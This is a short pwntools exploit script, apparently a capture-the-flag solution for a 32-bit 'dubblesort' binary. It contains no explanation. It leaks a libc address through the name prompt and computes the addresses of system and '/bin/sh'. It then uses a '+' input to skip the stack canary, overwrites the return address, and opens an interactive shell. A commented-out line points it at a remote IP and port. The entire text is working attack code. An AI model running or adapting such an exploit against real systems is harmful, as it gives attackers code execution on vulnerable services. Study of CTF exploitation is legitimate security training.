from pwn import *  
  
#sh = process('./dubblesort',env={"LD_PRELOAD" : "./libc_32.so.6"}) 
sh = process('./dubblesort') 
#sh = remote('111.198.29.45',57605)  
libc = ELF('./libc_32.so.6')  
off = 0x1AE244  
  
#泄露地址并计算出libc的地址  
payload = b'a'*0x1c 
sh.sendafter("name :",payload)  
sh.recvuntil(payload)  
#计算libc加载地址  
libc_base = u32(sh.recv(4)) - off  
system_addr = libc_base + libc.sym['system']  
#binsh_addr = libc_base + libc.search('/bin/sh').next()
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))  
  
print ('libc_base=',hex(libc_base))  
print ('system_addr=',hex(system_addr))  
  
n = 35  
sh.sendlineafter('sort :',str(n))  
  
for i in range(0,n-11):  
   sh.sendlineafter('number :',str(0))  
  
sh.sendlineafter('number :','+')  
  
for i in range(0,9):  
   sh.sendlineafter('number :',str(system_addr))  
sh.sendlineafter('number :',str(binsh_addr))  
  
sh.interactive()  
